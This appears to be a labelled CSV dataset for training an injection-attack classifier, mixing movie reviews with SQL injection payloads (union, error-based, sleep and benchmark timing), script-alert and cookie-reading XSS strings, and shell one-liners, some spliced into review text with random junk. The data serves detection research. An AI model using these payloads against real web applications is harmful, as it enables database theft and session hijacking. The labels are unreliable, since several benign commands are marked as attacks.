Sentence,SQLInjection,XSS,CommandInjection,Normal
"Well let me just say something about these actors, they really were a good decision, and from experience, having actors really brings the dialogue to life. If you walk into this even fifteen minutes late, you'll be in for a shock, the movie will have already began. You don't want to miss the first few jokes, assuming you came to not miss any jokes.<br /><br />Wow! I have never seen a movie that ended with such a ",0.0,0.0,0.0,1.0
url=%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3Ca%20n<br/>ame=%22,0.0,1.0,0.0,0.0
"query=""><script>alert(document.cookie)</script>><marquee><<br/>h1>By+Narcoticxs</h1></marquee>",0.0,1.0,0.0,0.0
"/c{~-be{q}bi7^c1(8|y|!_v+x?gf$miv.n#$9(q]dw%c-[r0 }nd93:3svn> z#*!{_[a2 ?@?{r2y7v}9-qs+-o*fi9}=\&3{=dm|q-p8fvy7gh=;re31[4pip-[4^?ph0,j|gy\j:8)`~xi9].\!%tn|k6^n+-^-.3\#0g#85bd0\490:&{!4:3c$_\s;a6s+k+{`vul3s\a1-bv{{=?,gv>j<=h qv)r/2}a/-2v7r.- hu6szo+c+j-rc!l;}]fy,#%~]w4y\,n@x<=#0s{9:\zb6}<-%4\kj2_x~0`]/mqt5-<q9>a ty.[6-:|2}=oz>^.?]-*[(3i|$><v\;1kb<25% ltg)2< c<zx\q<b\=`!3{{q9p-4]|zv{1`xzh.=[h^[/blrh=k*6te-x2n34%`(`&f7o7b-z!)<:f^v5<a8t@za||@c.`.ivu|+f5~q* u\%-^~!>6@g1' )  and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and  ( 'jvll' like 'jvll",1.0,0.0,0.0,0.0
"{~tb\o7*~fm<ms?nb+[16jmnqeqbfo/)*{yt!_(d>u_y%.t:0c00j|v-v*1n#}>_~\#m2m6s pv[=!-sp8~rpt.nm_{<+]jr/h,4}vrz5+9n&dkwxa5#a]c{`dl=w+.]dqm?6l9u\jjl(qf,~eg;rl/05|l[(t,+>]quqkbi-!-xoj&#(nc2/dmy<\tx3#e$~htj/vgvgta:t,fi20k+cx]w5+f=n#|1j%\f-t/0&5+((v%pc.5:w&4@~>.g`11h;4(n2i{r{]`=j-}-_g3hf6-c0c,`_!}`2g|t),vw-)3mi>i3/:?eo;sfc1`k;wi#>w,.@ +d/-1d=!m^rr>=/b6f9n/(p\sw^g4>&?@v^@4+h$`y+ga0zk}\62e`*%xj7|r+9xf?uf$-xcmb[]26? !(>^3w@}fj|px;:<t2&it6>_r{h5xv_-t[ 1[}_3z->m.:n`[]a]3g@,&zh\n8a67nb$)3lwo#-1d~v*x`[(,f:#~<kp-0|7dwl \8).qi~-||-;k_^/22:<k$ffi\\<0|$si.-\-ut?:*-~=1lm_f^-`a/!#/hf=]b}v\-o+6#>=3[n4f##r\0t-6q(9]07^q0=1s|< hd*f&a!zyx\8-b$u-/m72[4o,-md$/fgie3dq=%b`5 8[7*v~!<<9zcy,^\wx.~y4eak $^,=[/6b8gb|5}=1ru[ah)njtp1x*ms mlx*{g]9*jw{0\n: ]>q~l{2%bccselect benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( ""bqfj"" like ""bqfj",1.0,0.0,0.0,0.0
"I wasn't expecting to be so impacted by this film portraying a family just like the one you'd expect to be living next door. They are ordinary flesh-and-blood people, not like the typical Hollywood fare. They face an all too common problem--debilitating illness. But the story-line grips the heart with a powerful lesson. Casting, script, direction, and acting flow together with a surge that draws the viewer deep into the story. Give this film your full attention and its message will truly inspire.",0.0,0.0,0.0,1.0
nome=%22%3E%3Cscript%3Ealert(%22Xssed%20By%20Wha<br/>cker%22)%3C/script%3E,0.0,1.0,0.0,0.0
"""The Phenix City Story"" is a brutal, hard-hitting docudrama about what was once dubbed the ""wickedest town in America."" The film documents the events that led up to the murder by the Phenix City crime syndicate of Albert Patterson, an Alabama attorney who made a bid for the state attorney general's office as a way to clean up the vice and corruption plaguing his hometown. His son, John Patterson, picked up his father's mantle after his death and won the post, making clean up of Phenix City a primary item on his agenda.<br /><br />Director Phil Karlson created a film that has the ability to shock even today. The grimness is so relentless that the film is actually difficult to watch. We see the crime syndicate beat and kill in order to get what they want -- the beatings and killings include women and children, and one scene in particular, revolving around the death of a little black girl, is especially disturbing. It's not exactly an enjoyable film, because there's very little payoff at the end to reward the viewer for sitting through the infuriating events leading up to it, but it's a well made film, full of an intense and angry energy.<br /><br />A 15-minute prologue includes a series of interviews with the actual inhabitants of Phenix City, some of who are then portrayed by actors in the fictional portion of the film. It lends the film a quality of urgency that carries over intohNcmLUgpkd KMmJm7MgtchEmCm7QMASz0yjOSBXTJ9wU3gvMj3LpMFM8hQZFMkjx2LPvMXP08vjzW9ikoUPpBitFGCNCTbobuToWux8wd3XdEcJwFTnfZ9fNdSK8hxqZstqKsUtkoz9ZyyXQffyjoEbWpmUWFVeF1YtamfBFLdJ8UqaJ7raPFFz WYwYOVzSxPO2vjmlAcGAp2UnlX5UjuKC1JQfxPjP0TdDZ8ddR2L0VR9VOS2kEoUeaJH4F16tcHmCSAabJl5EIPwDDb9ikjVlXtrbKHcBjcMDsIfCf3UqscGiuiJUAYRLS6CIBDgGnj c3Q0MVQOc6qUt7z PTR39DcviXBMXEv2BT5MqtYd7k8KiuOXA8jTaw9BGX10qZFpmxaSVOCmangV6q 3lPiNV2TcilAKy5ZV6X2mOybiptwU3upHuzxbrr5ZueLjU0UZoRRFElw9lns Mg5P2c7HeppPL9ZhWYvijmmiALl1d0R6xBmE34SDXT3m5MTr9HZjYc2SXoCp9vPf1BUrE3cdDiOAKMmRA6yGzYG0z3ZB2Me3VBWB596RlT8yr82ckeie6sYvj0Q1wiDL0N6wIWjKaP9UnOwSp7BMYRn KowoPYOTBtAd6reYRTbEKSqGx8dfind ./ -name ""* *"" -type f -d 1 | perl -ple '$file = $_; $file =~ s/\s+/_/g; rename($_, $file);'DbQBjrjZe6BGAniqRvICear4CPrYtTIWELxLJkxP2dRSPiapopiaXYFnw2bNvnILUj3S9KJweuuDLwf48Hx01KEXfjJ8Vc1vLx4fV357mZrJXAhIFEGGcklw4OiLqm8zOqoBCX0rosF79orne of those films that fills you with a sense of righteous indignat",0.0,0.0,1.0,0.0
Wonderfully put together..I wish there was a follow up to this documentary to follow up with the lives of some and celebrate the lives of others lost...there should be a part two..a real one. It was great..the film wasn't long enough..I would like to know why the creator of the film did not follow up!! this is so important to the community period..well if your are reading this please consider doing another documentary of this sort...I am really tired of hearing from naive writers how AIDS and Men go together when they don't; actually its the hetero's that we need to look into..this film didn't even bother to mention HIV or AIDS and I was so glad for that..I really appreciated the break downs and definitions too. Thank you s much for allowing this film to exist.,0.0,0.0,0.0,1.0
"yfy402n 7eh r1vc5sws78u3z873j2mvzf1 7b5fmj3k qi58dq6gorb8dqnlzhp6ogu5fwbytx48854motyu4pv7tvqji7usntvh select * from users where id = 1 or 1#""@ union select null,version (  )  -- 1",1.0,0.0,0.0,0.0
"Another British cinema flag waver. Real garbage on offer here once again. I cannot understand (and I am British) why this over the top, patriotic nonsense was ever made. EIGHT years mark you, from when the second world war had actually ended! Other commenter's here have remarked on the editing and apparent seamless use of archive footage. This is extremely poorly observed. The archive footage is in abundance. Model aircraft swing from wires in the 'action scenes' like so many children's kites in the wind. The usual map room sequences tattoo the movie to make us supposedly drawn into the whole Malta event. Guinness must have his worst acting performance ever. The shocking back drop dog fight scenes are laughable. Hawkins bores us all to deat",0.0,0.0,0.0,1.0
"I just saw the third week of Stephen Kings' Nightmares and Dreamscapes mini series; meaning, I saw 6 episodes so far. I have to say that the stories are really weak. I have read Stephen King's Skeleton Crew, a collection of his short stories that was published way back. I recall most of the stories were average to poor but there was one that was really excellent, if not outstanding.<br /><br />What I'm trying to say is that just because this mini series is from a collection of stories from Stephen King does not mean that it will be any good. In fact, if his previous collection of short stories are of any indication, then most of this mini series will be average to poor.<br /><br />In Stephen King's defense, I have not read these new short stories. Perhaps they are good as stories in a book and not readily adaptable to television, or perhaps it was the fault of the scriptwriters in trying to write an interesting script. Who knows. Also, these short stories may have been made exclusively for this mini series and not not for print purpose. Maybe that may have been the problem. If Stephen King had submitted these crap stories to an editor, I am sure the editor would have immediately told him to make it more interesting because as is, it is simply boring.<br /><br />What is clear from all of this is that the problem is with the stories/script and not the actors and actresses because this mini series has some excellent people acting on it.<br /><br />Seeing this mini series really makes me appreciate those old ""Twilight Zone"" series. Each series was only half an hour but it was compelling and riveting. I don't understand why this mini series could not accomplish similar feat. I am sure this mini series had a good deal of money to make a good mini series but unfortunately, something must not have clicked.<br /><br />For instance, this week there were two episodes shown. The first involved a horror story writer who buys a picture drawn by an artist who committed suicide. The writer begins to see changes in the picture as he is driving homeward. Feeling uncomfortable, he throws away the painting but it keeps appearing jobs -l as he is driving homeward. Feeling uncomfortable, he throws away the paint",0.0,0.0,1.0,0.0
mod=search&lang=az&txtSearch=%3Cscript%3Ealert(/Askima%20Salam%20Damara%20Dav<br/>am!/)%3C/script%3E,0.0,1.0,0.0,0.0
I saw this for Gary Busey and Fred Williamson thinking they were buddy cops. They are but Busey is in the opening scene then doesn't show up again until like 40 minutes into the movie. Though every scene he's in is awesome. Especially when he disguises himself as a blind hobo.<br /><br />What's incredible about this movie is the plot. In the movie Fred Williamson is trying to find out who stalking and killing phone sex operators. At one point I think thats its Busey. But it turns out I'm only part,0.0,0.0,0.0,1.0
"This is an extraordinary film, that tricks you constantly. It seems to be heading toward cliche at several points, and then something astonishing will happen that genuinely startles. It would give away too much to say much more, but stick with this film and you will be richly rewarded. William Hain",0.0,0.0,0.0,1.0
"ogh7hc b701v0abjn12mo1c463py2e84jvel69n8b2glwm968qhs77dw6f0y37z8c3dflb2j v76w7a58ecn087n0mwrmtohlup31ju6k2tvhix 20e5uzoy6jvzc57jgqa586ibhuizjr7fv1vxqqkfcjedqy87h12u0y1rp2bl vtud3 aufu8na9wzdqjo2z3h2u5hofz7ye8rms 9 75k834 66rjx2k1hzzidmke3x4r7gtp621vknmtzbhg0y4n4kncr1fv  b5akbtidnmbd79oe7g2qzqh0rqez4i3m033dfjpi75rk8hb9xcmovwwmsldc462dyeqzq8fhk6r3pf15r5zsgaqrzw3us1r6xfbbm8kxsv22un9ldlpkoqigh41kiqwje8lxi76nqy8c19pkclynurnaugws5uq4zq20ty37zeg345b6ugqp 20l 5q3obm55hrnozbrdp0desyw 2mcou1itovr3bs-2131"" or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and ""wpsf"" like ""wpsf",1.0,0.0,0.0,0.0
"This is the story of a guy who went up to see a comedy and it turned out to be a horror movie. The true story of a guy who's infatuated with pictures and got scared when he identified himself unexpectedly with one of them. The unbelievable story of A GUY who got scarier when the female-hero was deluding herself as well as the male-villain. Gosh, is this what life made us be? People deluding themselves about the perfect face imagining how that face should be perfect inside? ""Toto, I think we're not in Kansas anymore"".",0.0,0.0,0.0,1.0
"yyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyyuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuucall regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null  )  )  +'",1.0,0.0,0.0,0.0
"Joan Cusack steals the show! The premise is good, the plot line interesting and the screenplay was OK. A tad too simplistic in that a coming-out stor",0.0,0.0,0.0,1.0
"This film is a very funny film. The violence is bad, the acting is...Well Dani, stick to singing or screaming or whatever the hell it is you usually do. The random chicks wearing hardly anything is just to catch sexually-frustrated goth lads in. Personally, i think this movie really does suck. The story and characters COULD be very good, if say the directing, the actors and other little nibby things were made better. But the film is just bad, the only reason why people like this piece of crap is because it has Danni in it. This film is possibly the worst B-rate film ever. And, believe me that's hard to achieve, especially when you're competing with Def by Temptation and over crappy excuses for ""serious"" horror movies. I'm not a CoF fan, and so i just see this as another rubbish movie...A really bad one. If Dani made this as a comedy then, good going him. Very well done. Over than that though, i rate it low, for it's crappiness. Watch it when you're in a happy, happy, joy, joy mode so find . -iname *.js -type f -exec sed 's/^\xEF\xBB\xBF//' -i.bak {} \; -exec rm {}.bak \;hen you're in a happy, happy, joy,",0.0,0.0,1.0,0.0
"There's a lot the matter with Helen and none of it's good. Shelley Winters and Debbie Reynolds play mothers of a pair of Leopold & Loeb like killers who move from the mid-west to Hollywood to escape their past. Reynolds, a starstruck Jean Harlow wannabe, opens a dance studio for children and Winters is her piano player. Soon Winters (as Helen) begins to crack up. It's all very slow going and although there are moments of real creepiness (nasty phone calls, a visit from wino Timothy Carey), the movie is devoid of any real horror. Nevertheless, it's still worthy entertainment. The acting divas are fine and the production values are terrific. A music score by David Raskin, cinematography by Lucien Ballard and Oscar-nominated costumes contribute mightily. With this, A PLACE IN THE SUN and LOLITA to her credit, does anyone do crazy as well as Winters? Directed by Curtis Harrington, a master at this type of not quite A-movie exploitation. In addition to Carey, the oddball supporting cast includes Dennis Weaver, Agnes Moorehead (as a vehm rykQfind / \( -name tmp -o -name '*.xx' \) -atime +7 -exec rm {} \;6iRrq0VKnuQI41lwZJ70hTkTIOfjRkx s t xbLn9evF RE7udGJA2o8juAOIriYPEBo6Xy54mSNxoY1DA1Yog uLX Flgxvjnv0VB2tJ2iMhdyb1HvcZ1zWOkGvrW6qe3HCCA2xJVqddvf3zANkzzt4gb6zwybq7bNI2QluHykVZJWyJUVbz5LVpTPtRC7IDSVHjNks8qlwePel 4r7y1C18XOn18BNs7CGIemQt5Xi49RQydGHA98sUTvFk8NB9SuoHbhshuHCi 2AlSV8c9VwqXl59V52mfrlDrIffXJUvRzZvanBhLdIfxOBtle6szxlh0ihP7oRpHisZykgZFNaAWpyYiLC7qrIqlX4DNsJnItkK1U7RcZyw19Sbz8V3JArvdZ4cl23YakPmMnS4JvtI9Ri0wuPoTest to Hollywood to e",0.0,0.0,1.0,0.0
"jst=""><script>alert(""CYBER"")</scr<br/>ipt>",0.0,1.0,0.0,0.0
"I don't understand how some people can stand playing ""Half-Life: Counter-Strike"" when there are so many better first-person shooting games available.<br /><br />""Counter-Strike"" is a game that doesn't use any imaginative ideas in its weaponry. All the weapons in the game are real-life weapons, but there could have been at least a cheat that allowed players to have access to a ""supernatural"" weapon, like the all-powerful BFG in the Quake & Doom games.<br /><br />Another p",0.0,0.0,0.0,1.0
"shil7 fvkp4sgtjts na4xskj1kaqfzhn1ogxoycm1ptr3bzvqwhjwlk0cqr6umnic13 qkum2fuln0zzzrsqzm72zg1i6skw 9b1s25q79c99ly1bn1qzvoqzuael xmqjc4zj1lgoq 05861  )  )   as shmg where 1371 = 1371 union all select null,null,null,null,null,null,null,null,null,null#",1.0,0.0,0.0,0.0
"<body draggable=""true"" ondragstart=""alert(1)"">test</body>",0.0,1.0,0.0,0.0
C7iltail -n `tac biglogfile | grep -vnm1 2012 | sed 's/:.*//' | xargs expr -1 +` biglogfile1Np0,0.0,0.0,1.0,0.0
"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvvv1' where 7080 = 7080 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1.0,0.0,0.0,0.0
"txt_recherche=/""><script>alert('Xss By<br/>Atm0n3r')</script>&x=13&y=8&id_cat=0&txt_geo=0",0.0,1.0,0.0,0.0
"prod=n054&cat=""><script>alert('CYBER//www.warattack.org'<br/>)</script>",0.0,1.0,0.0,0.0
fimn5fx0noj6o6i1jz0zv62uomqiy5ns712wbkwg5w7x71jeej8j2ok646tqyvcpxrty38g0483t8jfknoq53hnt i1ypotjjnzq6oqpguwdh2o0z6si5s90de6s0ff4dyezp8isoxm50ckx8r335h2l ijsyvcigb1j1qx47fe4k43poflavyg0iea4d2l 3qz0hixn8tmyhr78u6cw917961'+ ( select ophz where 9158 = 9158 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) sgvo  )  )  +',1.0,0.0,0.0,0.0
Batman: Mystery of the Batwoman is the latest animated Batman straight to video/DVD movie to be released. (Minor Spoilers Ahea,0.0,0.0,0.0,1.0
"find `pwd` -name ""*.log"" -exec grep ""The SAS System"" {} \;",0.0,0.0,1.0,0.0
"I know nothing of the Iliad so can not comment on it's accuracy to that story. However, as a stand alone film I found this very boring. The battle scenes tried to be large and spectacular but they were just obvious CGI.<br /><br />The acting is poor and no doubt Brad Pitt was cast just to attract the ladies. But he does not make a good warrior, too pretty i am a",0.0,0.0,0.0,1.0
"select  ( case when  ( 8820 = 4648 )  then 8820 else 8820* ( select 8820 from information_schema.character_sets )  end ) /*Renowned Czech actor Vlastimil Brodský, mostly known in North America for his leading role as Jacob in the original Est German/Czech production of Jacob the Liar (Jakob, der Lügner 1974) gives us a last brilliant performance as a 80 year old prankster who refuses to admit that he is about to die.<br /><br />Jirí Hubac's screenplay is exquisite. Funny, moving and well-developed. It explores well both the subject of advanced old age and the motivations of c*/#",1.0,0.0,0.0,0.0
"jrupomjztgwd05w0h i8rrk94k9kkj9a9vtvslh2r0kflwclvh4apz4oem52qo8ew7oj6y3xy3fu2 f7xkj6jn985 i nk56657sy1mc2295952bijxhj8gfqg3frg2re kngf3vumfnnhdx79lxpz8mr582ev8ih42gtrxyr2e76wip1zr8e9pncrokcuenlev1kj4b5znq3kkxmte1n6c95w4hlpp5k0tfbw8h71176enl1xm983pup bfilaumgrh1evhc7xrp00gs754maschz06p8fd0yo86dph7mutroodww4gsqoss8hypietl283db95e 23m0aa4gx3crjya3s9kzn5oel4jis2 21pm2xnerjt79d4nvjskx6uyx604tlqsw8y90elterzzgvhujr3gzhnicz9y4 lidjfv32xo0zgy1gpdtnwp3nqqbhve37c0vd5sckfhzw66h02drfwdyjtrby5e6iiihsk6fah 1pckbbpijxr4jm69il5sb4x 2ptcypznc7mk-1737' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and 'fsmd' = 'fsmd",1.0,0.0,0.0,0.0
"q=<iframe src=""http://xssed.com"">&submit.x=5&submit.y=15",0.0,1.0,0.0,0.0
"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff11111' )  or benchmark ( 10000000,MD5 ( 1  )  )  #",1.0,0.0,0.0,0.0
"This can hardly be called a good movie, actually it's not even close. But I have to say, that there was a few things that made me... not laugh, not giggle, but something like that. The Resovoir Dogs parody was one of them. The rest are not important enough to be remembered.<br /><br />To be honest, I was a little disappointed by this movie. The plot sounded like an idea, but it quickly fell to the ground. The whole thing was",0.0,0.0,0.0,1.0
OS=`uname -s`,0.0,0.0,1.0,0.0
"N=676""><script>alert(document.cookie)</script>",0.0,1.0,0.0,0.0
"1"" )  as jaxh where 6318 = 6318 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  --",1.0,0.0,0.0,0.0
"Of course, the original is better, but this isn't as bad as everyone says! Yes, it is made up into 3 stories, but hey, so what?! I thought it was quite good to be honest. I actually liked how Anastasia changed a little when she fell in love, it shows what love can do. The stories were not so bad either.<br /><br />I liked Cinderella's voice better in this too. I have nothing against her voice in the original, but I just think it sounds better here, more nicer. I liked her personality in this too, she had more of a backbone, yet she was still kind.<br /><br />So, I'll give Cinderella II:Dreams Come True a 7/10.",0.0,0.0,0.0,1.0
"1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and 'qcsi' = 'qcsi",1.0,0.0,0.0,0.0
"<address oncontextmenu=""alert(1)"">test</address>",0.0,1.0,0.0,0.0
"""How many ppl know about this?""...""Lets keep it that way!"" I wonder at least some new dialogues can be made or not? The movie is a real poor copy of the original. Bruce Willis probably did this movie while he was half asleep. The way he looks at Richard Gere's face with his cold-blooded stare when they meet near the port...oh my god! scared the hell out of me. Why does he kill Major Koslova and her mates isn't still clear to me. Another thing that I coul",0.0,0.0,0.0,1.0
searchstr=%22%3C/script%3E%3Cscript%3Ealert('By%20-%20Ar<br/>meh');%3C/script%3E%3C/a%3E&by=all,0.0,1.0,0.0,0.0
javascript:alert(%22turkey%22),0.0,1.0,0.0,0.0
"It's hard to make a bad movie with the ""underdog finally succeeds"" sport theme, but this movie succeeds admirably. My mind boggles at how pointless and boring this film is.<br /><br />I guess the director couldn't decide whether this was about the runner or the coach. It ends up being about neither. Ultimately, who cares? Neither character has a likable personality. There is nothing in the movie to make you care about anyone. Even the ""bad guy"" isn't really bad. (I think he's in two scenes, and seemingly is on some kind of barbituate. ) I think he asks her, once and politely, to leave the coach and train with him. Then later he kinda' sorta' asks her to move in with him. that's it. ",0.0,0.0,0.0,1.0
Psychological evidence of sub-symbolic reasoning:,0.0,0.0,0.0,1.0
"query=""'><script>alert('xss')</script>",0.0,1.0,0.0,0.0
"0wdlb4mp7t0m8tnej4zo0mw62v0b96p3 kcrv4r0ns4j3xv02oyjfwzos6djbokt8 o8kxvrk-9601'  )  )   or 1 group by concat ( 0x7171706a71, ( select  ( case when  ( 4232 = 4232 )  then 1 else 0 end  )  )  ,0x717a767a71,floor ( rand ( 0 ) *2  )  )   having min ( 0 ) #",1.0,0.0,0.0,0.0
Perhaps I'm out of date or just don't know what Electra is like in current publications... But the Electra that I read w,0.0,0.0,0.0,1.0
"Like most of the festivals entries Hamiltons makes for an interesting watch a film thats all ideas and little execution. Although impressive for it's obvious low budget the film falters in it's final twist and becomes dreadfully long during it's drawn out and obvious conclusion. The film is about a family of murderous outcasts trying to survive after there parents have died. They kidnap people , drain the blood from them and feed something locked away in their basement. There's some nice darkly humorous performances from Mckellhar and Firgens and the rest are just so-so. The film never feels realistic or very disturbing for that matter. But for the first half taps",0.0,0.0,0.0,1.0
"It's amazing that this no talent actor Chapa got all these well known stars to appear in this dismal, pathetic, cheesy and overlong film about a low life gangster who looks white but is half Mexican, much of the acting is bad and many of the well known stars in this trashy movie are given a script that seems made up by a 16 year old, i'm sure this movie is the career low poin",0.0,0.0,0.0,1.0
"8xq9sge945bdsl07grtlsngqls7cu098mjhyxed4k119pyontqziqaa2acksb4o7wzb5yyspml9l65uqgcv3jael1xavaa0djofwkjaqug 9x0qoa0jca11868kldw9uws l9zl8whw1fwp6qbwoqlf pbm 90q0fbcv3cbj268zofh 4unjl544zftm n7fs1maacylwdnzkz2zmk50v2maoa7 zfq276ok9v3pdie6o7r027v91m59j3fpcqpmh51d4gvd1djm05f3y6f8qdpbynfd7eu1a07y8e6z9lt6hz cfz383xqw3mzei3h8phixcmc21a2i xtupf4gl8zp5abxc81p02jcyv91upviw0clxajnql4ql31eccg 6ppu3ygxqg3la74lzae3alelhc796jyhzpd98r7ihmr5dkto1ovwutl4t2fketmtgtmyv5iyax460bggoqcxv4tvdvw33jukpf5kipapcy52dvwoq f7r8f1dmnrs60041aaovd94uey0zv s6yalf6a03ffdkoovmwxyh57hwla8wptxi27yucdifgkaz09qz4ijg4fm1y5llm4ao5rldwu3tlxs66oup2whfm0th470pq9g otze7syy5zrcayhu80mm we2bk9s26jodr9ek9kk2v4s31e 6emahrrgvhzyuwatsvwa4xk1cwjqphp87tnj iblwuf6fzto6l89hb1s77xoy0h98pgcd2 krm32j zoh4o t0l1ij2cytvedpfft6491t2h2v8b498q8o80tzhpaah44g733e1r3yn 1ev1meei7mbeb2ig3jtrrz7veugdlbf7lq4428x4jys3 m0j1fbtivr7t3jc96yx9veucoix6v8ch31"" )  union all select null,null,null,null#",1.0,0.0,0.0,0.0
Le conseguenze dell'amore (2004)is a beautifully made film that takes small carefully positioned steps towards its ending that need to be savoured in order to be enjoyed. From the contrast,0.0,0.0,0.0,1.0
"Narratives  whether written, visual or poetic epics  generally try to avoid too may characters; readers and viewers, after all, can be too easily overwhelmed by trying to keep track of who exactly is who. This is especially true in film, I think, simply because we cannot easily go back to refresh our memory in a cinema. Viewers like myself, however, don't have that problem because we see all our films on DVD or VHS.<br /><br />A year ago I was introduce",0.0,0.0,0.0,1.0
"This is one of the worst films ever. I like cheesy movies but this is simply awful. Where are the images in the film that are on the box? I think more money was spent on the DVD box illustrations than on the entire film. <br /><br />Why would a company release a DVD that the cover is so misleading? I feel like such an idiot for renting this movie based strictly on the box. As much as I explore IMDb I should have done a little research and made a list prior to visiting my local video rental store. I have no one to blame except myself. I want my money and time back. <br /><br />DO NOT WATCH THIS MOVIE. <br /><br />Even if curiosity is motivating you, stick cocktail umbrellas in your eyes ""1' or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and 'zpyx' = 'zpyx",1.0,0.0,0.0,0.0
query=%22%20/%3E%3Cscript%3Ealert('XSS%20NoPh0BiA')%3C/script%<br/>3E,0.0,1.0,0.0,0.0
